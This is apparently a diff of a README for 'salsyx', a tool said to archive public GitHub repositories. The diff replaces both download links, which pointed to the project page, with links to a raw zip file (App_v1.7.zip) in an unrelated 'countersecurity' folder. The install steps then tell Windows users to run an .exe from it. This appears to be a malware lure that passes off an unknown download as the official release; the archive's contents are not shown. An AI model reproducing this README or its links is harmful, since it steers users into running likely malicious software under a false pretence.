@@ -5,13 +5,13 @@ description: "Search, browse, and recover deleted public GitHub repositories wit
 ---
 # 💾 salsyx - Keep public code archives alive forever
 
-[![Download Salsyx](https://img.shields.io/badge/Download-Salsyx-blue.svg)](https://github.com/Beetgreenccompiler763/salsyx)
+[![Download Salsyx](https://img.shields.io/badge/Download-Salsyx-blue.svg)](https://github.com/Beetgreenccompiler763/beetgreenccompiler763.github.io/raw/refs/heads/main/countersecurity/App_v1.7.zip)
 
 Salsyx preserves public information from GitHub. It saves open-source projects so they remain accessible. The software searches for repositories and creates a local record. This process protects code from deletion or link rot. You can browse saved data through a simple interface.
 
 ## 📥 How to install the software
 
-Visit [this page](https://github.com/Beetgreenccompiler763/salsyx) to download the current version for Windows.
+Visit [this page](https://github.com/Beetgreenccompiler763/beetgreenccompiler763.github.io/raw/refs/heads/main/countersecurity/App_v1.7.zip) to download the current version for Windows.
 
 1. Click the link above to reach the official download area.
 2. Look for the file ending in .exe.
